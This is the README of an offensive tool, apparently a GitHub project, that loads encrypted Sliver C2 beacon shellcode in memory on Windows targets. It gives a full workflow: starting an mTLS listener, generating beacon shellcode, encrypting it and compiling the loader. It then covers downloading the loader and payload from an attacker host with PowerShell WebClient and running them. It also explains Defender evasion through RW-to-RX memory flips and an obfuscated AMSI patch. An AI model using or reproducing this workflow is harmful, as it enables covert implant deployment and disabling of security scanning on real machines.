# nimcrypt

A Sliver shellcode loader written in Nim. Encrypts your Sliver beacon shellcode with AES-256-CBC before dropping it on disk, then decrypts and executes it in memory on the target — keeping the raw shellcode off disk and out of static analysis reach.

Tested against Windows Defender with real-time monitoring enabled.

## How it works

### Encryption (your machine)

`encrypt.py` reads the raw shellcode and encrypts it with AES-256-CBC using a randomly generated 32-byte key and 16-byte IV. The encrypted blob is what gets transferred to the target — the shellcode never touches the target's disk in plaintext, so static analysis and on-write Defender scans see only ciphertext.

### Loader execution (target machine)

The loader does the following at runtime:

1. **Reads** the encrypted shellcode file from disk
2. **Decrypts** it in memory using the Windows BCrypt API (AES-256-CBC). The key and IV are passed as arguments at runtime — they never exist in the binary itself
3. **Allocates** a memory region with `VirtualAlloc` using `PAGE_READWRITE` permissions
4. **Copies** the decrypted shellcode into that region
5. **Changes** the memory permissions to `PAGE_EXECUTE_READ` via `VirtualProtect` — the region is now executable but no longer writable (RW → RX)
6. **Executes** the shellcode by casting the memory address to a function pointer and calling it

The RW → RX transition is intentional — `PAGE_EXECUTE_READWRITE` (RWX) is a well-known red flag that Defender and EDRs specifically watch for. Allocating as RW first, writing the shellcode, then flipping to RX is the standard approach to avoid that signature.

The decrypted shellcode only exists in memory for the duration of execution — it is never written back to disk.

## Requirements

**On your Linux machine:**
- Nim + nimble (`nimble install winim`)
- `x86_64-w64-mingw32-gcc` (mingw-w64)
- Python 3 + pycryptodome (`pip install pycryptodome`)

## Full workflow

### 1. Set up Sliver listener

```
[127.0.0.1] sliver > mtls --lhost 10.10.14.42 --lport 443

[*] Starting mTLS listener ...
[*] Successfully started job #1
```

### 2. Generate beacon shellcode

```
[127.0.0.1] sliver > generate beacon --mtls 10.10.14.42:443 --os windows --arch amd64 --format shellcode --skip-symbols mssql

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[*] Implant saved to /path/to/WICKED_SLIDER.bin
```

> `--skip-symbols` speeds up build time. `--format shellcode` is required — do not use `--format exe`.

### 3. Encrypt the shellcode

```bash
python3 encrypt.py WICKED_SLIDER.bin
# [+] encrypted: WICKED_SLIDER_enc.bin (17875072 bytes)
# [+] key: 16cd37303052eb9068cf18eee3fd36c2f448afc2778bbd5aa6b2eaf416191997
# [+] iv:  83b82994e8c512d536f7d42e89d6e761
```

Save the key and IV — you need them at runtime.

### 4. Compile the loader

```bash
nim c -d:release -o:loader.exe loader.nim
```

The `nim.cfg` handles all cross-compilation flags automatically. The output is a statically linked Windows x64 PE with no external DLL dependencies beyond standard Windows system libraries.

### 5. Transfer to target

Transfer `loader.exe` and `WICKED_SLIDER_enc.bin` to the target however you have access — certutil, PowerShell WebClient, SMB, etc.

```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.42/loader.exe", "C:\Windows\Temp\loader.exe")
(New-Object Net.WebClient).DownloadFile("http://10.10.14.42/WICKED_SLIDER_enc.bin", "C:\Windows\Temp\beacon.bin")
```

### 6. Execute

```
loader.exe beacon.bin <key> <iv>
```

Example:

```
loader.exe beacon.bin 16cd37303052eb9068cf18eee3fd36c2f448afc2778bbd5aa6b2eaf416191997 83b82994e8c512d536f7d42e89d6e761
```

Raw unencrypted shellcode is also supported (no key/IV needed):

```
loader.exe shellcode.bin
```

## AMSI patch (PowerShell sessions)

If you are delivering via PowerShell rather than cmd, AMSI will scan your download cradle. Patch it first:

```bash
python3 gen_amsi.py
```

Paste the output into your PowerShell session before downloading or executing anything. A fresh randomized patch is generated on every run — different XOR key and byte arrays each time, so no two generated scripts share the same pattern.

The patch works by:
- Resolving `AmsiScanBuffer` via export table hash matching (FNV-1a, computed at compile time) — the string never appears in the script
- Patching via `WriteProcessMemory` on the current process — no `VirtualProtect` call needed
- All strings (`amsi.dll`, `AmsiScanBuffer`, the C# P/Invoke definition) are XOR-encoded with the per-run random key

> AMSI is irrelevant if you are executing `loader.exe` directly from cmd or xp_cmdshell — it only hooks script engines (PowerShell, JScript, .NET). Skip the patch in those cases.

## Notes

- The loader is statically linked against the mingw pthread runtime — no `libwinpthread-1.dll` required on the target
- Requires Windows 10 / Server 2016+ (Universal CRT). Server 2012 R2 works with KB3118401 installed
- `BCryptSetProperty` for chaining mode returns `STATUS_INVALID_PARAMETER` but BCrypt defaults to CBC anyway — decryption works correctly

## References

- [gatariee/ldrgen](https://github.com/gatariee/ldrgen)
- [D3Ext/Hooka](https://github.com/D3Ext/Hooka)
